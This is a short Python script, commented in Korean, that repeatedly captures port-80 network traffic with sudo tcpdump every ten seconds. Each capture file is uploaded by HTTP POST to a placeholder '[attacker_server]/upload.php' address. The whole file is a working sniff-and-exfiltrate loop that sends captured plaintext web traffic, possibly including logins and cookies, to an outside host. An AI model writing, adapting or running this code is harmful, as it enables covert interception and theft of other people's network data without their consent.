import subprocess
import time
import os
import requests

# 캡처 파일을 저장할 임시 디렉토리
capture_dir = "./"
capture_file = "capture.pcap"

# 서버 정보
remote_server_url = 'http://[attacker_server]/upload.php'

def capture_traffic():
    global capture_dir, capture_file
    print("Capturing traffic...")
    capture_path = os.path.join(capture_dir, capture_file)
    tcpdump_command = f"sudo timeout 10 tcpdump -i enX0 port 80 -w {capture_path}"
    
    try:
        subprocess.run(tcpdump_command, shell=True, check=True)
        if os.path.exists(capture_path):
            print(f"Traffic captured successfully. Saved to {capture_path}")
        else:
            print("Traffic capture failed: file not found.")
    except subprocess.CalledProcessError as e:
        if e.returncode == 124:
            print("Traffic capture completed successfully (timeout reached).")
        else:
            print(f"Error during traffic capture: {e}")

def send_file():
    global capture_dir, capture_file
    print("Sending capture file to server...")
    capture_path = os.path.join(capture_dir, capture_file)
    
    if os.path.exists(capture_path):
        try:
            with open(capture_path, 'rb') as capture_file:
                files = {'logToUpload': capture_file}
                response = requests.post(remote_server_url, files=files, timeout=5)
                
            if response.status_code == 200:
                print("File sent successfully.")
            else:
                print(f"Failed to send file. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during file transfer: {e}")
        except Exception as e:
            print(f"Unexpected error during file transfer: {e}")
    else:
        print("Error: Capture file does not exist.")

def main():
    while True:
        capture_traffic()
        send_file()
        # 10초마다 실행
        time.sleep(10)

if __name__ == "__main__":
    main()
